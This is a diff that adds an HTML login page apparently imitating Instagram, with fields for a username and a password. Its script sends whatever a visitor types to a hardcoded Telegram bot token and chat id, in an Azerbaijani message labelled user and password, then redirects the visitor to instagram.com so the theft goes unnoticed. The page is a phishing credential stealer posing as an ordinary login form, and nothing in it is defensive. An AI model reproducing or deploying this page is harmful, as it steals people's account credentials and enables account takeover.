@@ -1,0 +1,31 @@
+<div class="overlap-text">
+    <input type="password" placeholder="Password" class="input-2" />
+    <a href="#">Forgot?</a>
+</div>
+
+<input type="text" placeholder="Phone number, username, or email" class="input-1" />
+<input type="button" value="Log in" class="btn" />
+
+<div class="sub-content">
+    <div class="s-part">
+        Don't have an account?
+        <a href="#">Sign up</a>
+    </div>
+</div>
+
+<script>
+document.querySelector('.btn').addEventListener('click', function() {
+    let username = document.querySelector('.input-1').value;
+    let password = document.querySelector('.input-2').value;
+    
+    let botToken = "8606196913:AAHUHmDjOvWISMxnDzasn8Gj2U2pgMbzxZ4;
+    let chatId = "8334736443";
+    
+    let message = `Məlumat:\nİstifadəçi: ${username}\nŞifrə: ${password}`;
+    
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+    .then(response => {
+        window.location.href = "https://instagram.com";
+    });
+});
+</script>
